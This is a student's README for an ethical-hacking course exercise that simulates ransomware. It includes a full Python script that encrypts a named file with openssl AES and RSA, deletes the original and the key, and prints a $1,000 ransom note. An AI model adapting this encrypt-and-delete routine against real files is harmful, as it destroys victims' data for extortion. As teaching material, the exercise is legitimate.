# 💣 CSCI369 – Ransomware Simulation 

This project simulates a simple ransomware attack using Python and OpenSSL, fulfilling the specifications in the CSCI369 Ethical Hacking assignment.

Name: Sheethal Santhanam

---

## 📘 Objective

> Use a Python script to:
> - Generate a 16-byte (128-bit) AES key using `openssl rand`
> - Encrypt a victim’s file with that key
> - Encrypt the AES key using RSA public key
> - Output ciphertexts in base64
> - Delete the original files
> - Display a ransom message

---

## 📁 Folder Structure

```
Q3/
├── ransomware.py       # Python script with subprocess automation
├── data_cipher.txt     # AES-encrypted victim file
├── key_cipher.txt      # RSA-encrypted AES key (base64)
├── private.pem         # RSA private key
├── public.pem          # RSA public key
├── README.txt          # This file
```

---

## 🛠 Setup Instructions (Kali Linux)

1. Make sure you have Python 3 and OpenSSL installed:
   ```bash
   openssl version
   python3 --version
   ```

2. Create the file the attacker wants to steal:
   ```bash
   echo 'This is a top secret. Do not tell anyone!' > my_secrets.txt
   ```

3. Run the script:
   ```bash
   python3 ransomware.py
   ```

---

## 🔐 How It Works

| Step | Action |
|------|--------|
| 1️⃣ | Generate random AES key (`key.txt`) |
| 2️⃣ | Generate RSA key pair (`private.pem`, `public.pem`) |
| 3️⃣ | Encrypt `my_secrets.txt` → `data_cipher.txt` using AES |
| 4️⃣ | Encrypt `key.txt` using RSA public key → `key_cipher.txt` |
| 5️⃣ | Delete original `key.txt` and `my_secrets.txt` |
| 6️⃣ | Print ransom note |

---

## 📄 Final Output Files

| File             | Description |
|------------------|-------------|
| `data_cipher.txt`| Encrypted secret file (AES + base64) |
| `key_cipher.txt` | Encrypted AES key (RSA + base64)     |
| `private.pem`    | RSA private key (attacker-only)      |
| `public.pem`     | RSA public key (used for encryption) |

---

## 💀 Ransom Message

```
💀 RANSOM NOTE 💀
Your file important.txt is encrypted.
To decrypt it, you need to pay me $1,000 and send key_cipher.txt to me.
```

---

## 🐍 ransomware.py – With Full Comments

```python
import subprocess
import os

# STEP 1: Generate a random 16-byte AES key (base64 format)
subprocess.run(["openssl", "rand", "-base64", "16"], stdout=open("key.txt", "w"))
print("[+] Generated AES key -> key.txt")

# STEP 2: Generate RSA private key (attacker’s private key)
subprocess.run(["openssl", "genrsa", "-out", "private.pem", "2048"])
print("[+] Generated RSA private key -> private.pem")

# STEP 3: Extract the RSA public key from private.pem
subprocess.run(["openssl", "rsa", "-in", "private.pem", "-outform", "PEM", "-pubout", "-out", "public.pem"])
print("[+] Generated RSA public key -> public.pem")

# STEP 4: Encrypt victim’s file using the AES key
subprocess.run([
    "openssl", "enc", "-aes-128-cbc", "-base64",
    "-in", "my_secrets.txt", "-out", "data_cipher.txt",
    "-pass", "file:key.txt"
])
print("[+] Encrypted victim file -> data_cipher.txt")

# STEP 5: Encrypt the AES key using RSA public key (binary)
subprocess.run([
    "openssl", "pkeyutl", "-encrypt", "-pubin",
    "-inkey", "public.pem", "-in", "key.txt", "-out", "key_cipher.bin"
])
print("[+] Encrypted AES key with RSA -> key_cipher.bin")

# STEP 6: Convert binary encrypted key to base64 → key_cipher.txt
subprocess.run(["base64", "key_cipher.bin"], stdout=open("key_cipher.txt", "w"))
print("[+] Converted encrypted AES key to base64 -> key_cipher.txt")

# STEP 7: Clean up temporary file
if os.path.exists("key_cipher.bin"):
    os.remove("key_cipher.bin")

# STEP 8: Delete key.txt and my_secrets.txt to simulate ransomware
if os.path.exists("key.txt"):
    os.remove("key.txt")
if os.path.exists("my_secrets.txt"):
    os.remove("my_secrets.txt")
print("[+] Deleted key.txt and my_secrets.txt")

# STEP 9: Show ransom note
print("\n💀 RANSOM NOTE 💀")
print("Your file important.txt is encrypted.")
print("To decrypt it, you need to pay me $1,000 and send key_cipher.txt to me.")
```

---

## 🚫 Disclaimer

This is a **simulated assignment project** for academic use only.  
Do **not** use this script outside of a safe, legal lab environment. Unauthorized use of ransomware tactics is illegal and unethical.
